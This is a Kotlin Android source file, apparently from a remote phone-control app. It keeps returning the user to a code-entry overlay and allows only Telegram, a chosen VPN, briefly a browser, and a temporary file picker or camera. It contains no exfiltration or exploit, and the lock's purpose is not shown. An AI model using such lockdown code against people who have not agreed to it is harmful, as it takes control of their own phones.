package com.phonecontrol

import android.app.AppOpsManager
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log

/**
 * Отслеживает текущее приложение на переднем плане.
 * Работает только пока активна code-блокировка с включённой обратной связью.
 *
 * Разрешённые приложения задаются через start().
 * Всё остальное → возврат на OverlayActivity.
 *
 * Браузер: разрешён максимум 20 сек, потом → code.
 * Если из браузера открылся TG (callback) — ок, таймер сбрасывается.
 */
object AppWatcher {

    private val TAG = "AppWatcher"

    // Telegram package names
    private val TG_PACKAGES = setOf(
        "org.telegram.messenger",
        "org.telegram.messenger.web",
        "com.telegram.messenger",
    )

    // Браузеры — разрешены только на 20 сек
    private val BROWSER_PACKAGES = setOf(
        "com.android.chrome",
        "com.chrome.beta",
        "com.chrome.dev",
        "org.mozilla.firefox",
        "com.opera.browser",
        "com.opera.mini.native",
        "com.microsoft.emmx",
        "com.brave.browser",
        "com.duckduckgo.mobile.android",
        "com.yandex.browser",
    )

    // Камеры — разрешены временно (пока пикер открыт)
    private val CAMERA_PACKAGES = setOf(
        // AOSP / стоковые
        "com.android.camera",
        "com.android.camera2",
        // Xiaomi / MIUI
        "com.miui.camera",
        "com.xiaomi.camera",
        // Tecno / itel / Infinix (HiOS)
        "com.transsion.camera",
        "com.tecno.camera",
        "com.itel.camera",
        "com.infinix.camera",
        "com.hios.camera",
    )

    // Файловые менеджеры и пикеры — разрешены временно
    private val FILEPICKER_PACKAGES = setOf(
        // Системный chooser
        "com.android.intentresolver",
        "com.android.internal.app",
        // Google Photo Picker
        "com.google.android.photopicker",
        // Xiaomi / MIUI
        "com.mi.android.globalFileexplorer",
        "com.xiaomi.fileexplorer",
        "com.miui.fileexplorer",
        // Tecno / HiOS
        "com.transsion.filemanager",
        "com.hios.filemanager",
        "com.tecno.filemanager",
        "com.itel.filemanager",
        "com.infinix.filemanager",
        // AOSP / стоковые
        "com.android.documentsui",
        "com.google.android.documentsui",
        // Samsung
        "com.sec.android.app.myfiles",
    )

    private val handler  = Handler(Looper.getMainLooper())
    private var running  = false
    private var appContext: Context? = null

    // Параметры текущей сессии
    private var allowedVpnPackage = ""   // com.happproxy / su.happ.proxyutility / llc.itdev.incy
    private var overlayMessage    = ""
    private var overlayChatId     = ""
    private var overlaySecret     = ""
    private var overlayAllowMedia = false

    // Состояние браузерного таймера
    private var browserTimerStart = 0L
    private var browserTimerActive = false

    // Временное разрешение для камеры/файлового пикера (пока пользователь выбирает)
    private var filePickerActive = false

    // Последнее известное приложение
    private var lastForeground = ""

    private val CHECK_INTERVAL_MS = 500L
    private val BROWSER_TIMEOUT_MS = 20_000L

    // ── Public API ────────────────────────────────────────────────────────────

    fun start(
        context: Context,
        vpnPackage: String,
        message: String,
        chatId: String,
        secret: String,
        allowMedia: Boolean,
    ) {
        if (running) stop()
        appContext        = context.applicationContext
        allowedVpnPackage = vpnPackage
        overlayMessage    = message
        overlayChatId     = chatId
        overlaySecret     = secret
        overlayAllowMedia = allowMedia
        running           = true
        browserTimerActive = false
        browserTimerStart  = 0L
        lastForeground     = ""
        Log.d(TAG, "AppWatcher started, vpn=$vpnPackage")
        scheduleCheck(context.applicationContext)
    }

    fun stop() {
        running    = false
        appContext = null
        handler.removeCallbacksAndMessages(null)
        Log.d(TAG, "AppWatcher stopped")
    }

    fun isRunning() = running

    /**
     * Вызывать перед открытием FilePickerActivity/камеры —
     * AppWatcher временно разрешает камеры, файловые менеджеры и chooser.
     */
    fun notifyFilePickerOpened() {
        filePickerActive = true
        Log.d(TAG, "File picker opened — relaxing restrictions")
    }

    /**
     * Вызывать когда FilePickerActivity завершилась (onDestroy/finish).
     */
    fun notifyFilePickerClosed() {
        filePickerActive = false
        Log.d(TAG, "File picker closed — restrictions restored")
    }

    /** Проверить есть ли разрешение PACKAGE_USAGE_STATS */
    fun hasPermission(context: Context): Boolean {
        val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = appOps.checkOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(),
            context.packageName
        )
        return mode == AppOpsManager.MODE_ALLOWED
    }

    /** Открыть настройки для выдачи разрешения */
    fun openPermissionSettings(context: Context) {
        context.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        })
    }

    // ── Internal ──────────────────────────────────────────────────────────────

    private fun scheduleCheck(context: Context) {
        if (!running) return
        handler.postDelayed({
            if (running) {
                val ctx = appContext ?: return@postDelayed
                checkForeground(ctx)
                scheduleCheck(ctx)
            }
        }, CHECK_INTERVAL_MS)
    }

    private fun checkForeground(context: Context) {
        val pkg = getForegroundPackage(context) ?: return
        if (pkg == lastForeground) {
            // Браузерный таймер — проверяем не истёк ли
            if (browserTimerActive && pkg in BROWSER_PACKAGES) {
                val elapsed = System.currentTimeMillis() - browserTimerStart
                if (elapsed > BROWSER_TIMEOUT_MS) {
                    Log.d(TAG, "Browser timeout! Returning to code overlay")
                    browserTimerActive = false
                    returnToOverlay(context)
                }
            }
            return
        }

        val prev = lastForeground
        lastForeground = pkg
        Log.d(TAG, "Foreground changed: $prev → $pkg")

        when {
            // Наш оверлей — ок
            pkg == context.packageName -> {
                browserTimerActive = false
                filePickerActive   = false
            }

            // Telegram — ок, сбрасываем браузерный таймер
            pkg in TG_PACKAGES -> {
                browserTimerActive = false
                Log.d(TAG, "Telegram opened — OK")
            }

            // Разрешённый VPN — ок
            pkg == allowedVpnPackage -> {
                browserTimerActive = false
                Log.d(TAG, "VPN opened — OK")
            }

            // Камера или файловый пикер — разрешены когда filePickerActive
            (pkg in CAMERA_PACKAGES || pkg in FILEPICKER_PACKAGES) && filePickerActive -> {
                browserTimerActive = false
                Log.d(TAG, "File picker/camera allowed: $pkg")
            }

            // Камера или файловый пикер БЕЗ флага — на overlay
            pkg in CAMERA_PACKAGES || pkg in FILEPICKER_PACKAGES -> {
                Log.d(TAG, "File picker/camera without flag: $pkg → returning to overlay")
                browserTimerActive = false
                returnToOverlay(context)
            }

            // Браузер — запускаем таймер 20 сек
            pkg in BROWSER_PACKAGES -> {
                browserTimerActive = true
                browserTimerStart  = System.currentTimeMillis()
                Log.d(TAG, "Browser opened, starting 20s timer")
            }

            // Всё остальное — немедленно на overlay
            else -> {
                Log.d(TAG, "Forbidden app: $pkg → returning to overlay")
                browserTimerActive = false
                returnToOverlay(context)
            }
        }
    }

    private fun returnToOverlay(context: Context) {
        OverlayActivity.start(
            context         = context,
            message         = overlayMessage,
            fbMode          = "code",
            chatId          = overlayChatId,
            codeSecret      = overlaySecret,
            allowMedia      = overlayAllowMedia,
            allowFeedback   = true,
        )
    }

    private fun getForegroundPackage(context: Context): String? {
        return try {
            val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val now = System.currentTimeMillis()
            val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 5000, now)
            if (stats.isNullOrEmpty()) return null
            stats.maxByOrNull { it.lastTimeUsed }?.packageName
        } catch (e: Exception) {
            Log.e(TAG, "getForegroundPackage error: ${e.message}")
            null
        }
    }
}
